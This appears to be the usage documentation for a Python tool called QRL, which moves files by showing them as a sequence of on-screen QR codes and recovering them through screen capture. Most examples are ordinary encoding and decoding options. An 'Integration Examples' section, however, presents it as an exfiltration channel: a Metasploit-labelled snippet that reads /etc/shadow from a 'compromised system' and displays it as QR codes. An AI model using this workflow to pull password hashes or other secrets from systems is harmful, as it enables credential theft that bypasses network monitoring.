# QRL Usage Examples

## Basic Server Usage

### Encode a single file

```python
from qrl_server import QRLEncoder, DisplayHandler

# Create encoder
encoder = QRLEncoder("sensitive_data.txt", chunk_size=1024)

# Generate QR codes
qr_images = encoder.encode()
print(f"Generated {len(qr_images)} QR codes")

# Display them
display = DisplayHandler(qr_images, duration=2.0)
display.start()
```

### Encode with custom settings

```python
encoder = QRLEncoder(
    "large_file.bin",
    chunk_size=2048,
    qr_version=30,
    error_correction="Q"
)

qr_images = encoder.encode()
metadata = encoder.get_metadata()
print(f"Total size: {metadata['total_size']} bytes")
print(f"Chunks: {metadata['total_chunks']}")
```

### Encode directory contents

```python
encoder = QRLEncoder("/path/to/directory", chunk_size=512)
qr_images = encoder.encode()
```

## Basic Client Usage

### Capture and decode

```python
from qrl_client import QRLDecoder, CaptureHandler

# Start capturing from primary monitor
capture = CaptureHandler(monitor=0, interval=0.5)
capture.start()

# Create decoder
decoder = QRLDecoder("output_file.txt", timeout=300)

# Capture frames for a while...
import time
time.sleep(30)

# Get captured frames and decode
frames = capture.get_frames()
success = decoder.decode(frames)

if success:
    print("Decoding successful!")
else:
    missing = decoder.get_missing_chunks()
    print(f"Missing chunks: {missing}")

capture.stop()
```

### Specify capture region

```python
# Capture from specific region (x, y, width, height)
capture = CaptureHandler(
    monitor=0,
    region=(100, 100, 800, 600),  # Capture 800x600 area starting at 100,100
    interval=0.3
)
capture.start()

# ... capture process ...

capture.stop()
```

## Command Line Examples

### Server: Encode and display a file

```bash
python -m qrl_server --file secret.txt --chunk-size 1024 --duration 2.0
```

### Server: Use specific QR version

```bash
python -m qrl_server --file data.bin --qr-version 25 --chunk-size 2048
```

### Client: Capture from primary monitor

```bash
python -m qrl_client --output recovered.txt --timeout 300
```

### Client: Capture from specific region

```bash
python -m qrl_client --output recovered.txt --region "0,0,1920,1080"
```

## Advanced Usage

### Monitor encoding progress

```python
from qrl_server import QRLEncoder

encoder = QRLEncoder("file.txt")
qr_images = encoder.encode()

metadata = encoder.get_metadata()
print(f"Encoding progress:")
print(f"  Total chunks: {metadata['total_chunks']}")
print(f"  Chunk size: {metadata['chunk_size']} bytes")
print(f"  Total data size: {metadata['total_size']} bytes")
print(f"  QR version: {metadata['qr_version']}")
```

### Monitor decoding progress

```python
from qrl_client import QRLDecoder

decoder = QRLDecoder("output.txt")

# During decoding...
while not decoder.is_complete():
    progress = decoder.get_progress()
    print(f"Progress: {progress['percentage']:.1f}% "
          f"({progress['decoded_chunks']}/{progress['total_chunks']})")
    time.sleep(1)
```

### Handle large files

```python
encoder = QRLEncoder(
    "large_file.iso",
    chunk_size=2048,  # Larger chunks for bigger file
    qr_version=40,    # Maximum QR version
    error_correction="M"  # Lower error correction to maximize capacity
)

qr_images = encoder.encode()
print(f"Total QR codes to display: {len(qr_images)}")
```

### Resume incomplete transfer

```python
decoder = QRLDecoder("partial_output.txt")

# Attempt decode
decoder.decode(initial_frames)

# Check what's missing
missing = decoder.get_missing_chunks()
if missing:
    print(f"Need to re-capture these chunks: {missing}")
    # Can continue capturing to get missing chunks
```

## Troubleshooting Examples

### Low QR detection rate

If the client is missing many chunks:

```python
# Server: Increase display duration
display = DisplayHandler(qr_images, duration=3.0)  # Increased from 2.0

# Client: Use higher error correction on server side
encoder = QRLEncoder(file, error_correction="H")  # More redundancy
```

### File too large

If file is too large for practical transfer:

```python
# Compress before encoding
import gzip
with open('file.txt', 'rb') as f_in:
    with gzip.open('file.txt.gz', 'wb') as f_out:
        f_out.write(f_in.read())

# Now encode the compressed version
encoder = QRLEncoder('file.txt.gz')
```

### Poor lighting conditions

If captures are unclear due to lighting:

```python
# Server: Reduce QR version for larger, clearer codes
encoder = QRLEncoder(file, qr_version=20)  # Smaller version = larger QR

# Client: Increase capture interval to get clearer frames
capture = CaptureHandler(interval=1.0)  # Slower but clearer
```

## Integration Examples

### With Metasploit/exploitation framework

```python
# Exfiltrate data from compromised system
import sys
sys.path.insert(0, '/path/to/qrl')

from qrl_server import QRLEncoder, DisplayHandler

# Read sensitive data
data_file = "/etc/shadow"  # Example
encoder = QRLEncoder(data_file)
qr_images = encoder.encode()
display = DisplayHandler(qr_images, duration=1.5)
display.start()
```

### Automated capture loop

```python
from qrl_client import QRLDecoder, CaptureHandler
import time

def capture_qr_loop(output_file, max_duration=300):
    capture = CaptureHandler(monitor=0, interval=0.5)
    decoder = QRLDecoder(output_file, timeout=max_duration)
    
    capture.start()
    start_time = time.time()
    
    while time.time() - start_time < max_duration:
        frames = capture.get_frames()
        if decoder.decode(frames):
            print("Successfully decoded!")
            break
        
        progress = decoder.get_progress()
        print(f"Progress: {progress['percentage']:.1f}%")
        time.sleep(5)
    
    capture.stop()

capture_qr_loop("recovered_data.txt")
```

## Performance Tips

1. **Optimal Chunk Size**: Start with 1024 bytes, adjust based on:
   - Smaller chunks (512): More QR codes but more robust
   - Larger chunks (2048): Fewer codes but more sensitive to capture quality

2. **Display Duration**: 
   - Fast: 1.0s (requires good lighting and camera)
   - Standard: 2.0s (recommended)
   - Slow: 3-5s (poor conditions)

3. **Error Correction Level**:
   - L (7%): Maximum capacity
   - M (15%): Balance (recommended)
   - Q (25%): Good redundancy
   - H (30%): Maximum redundancy
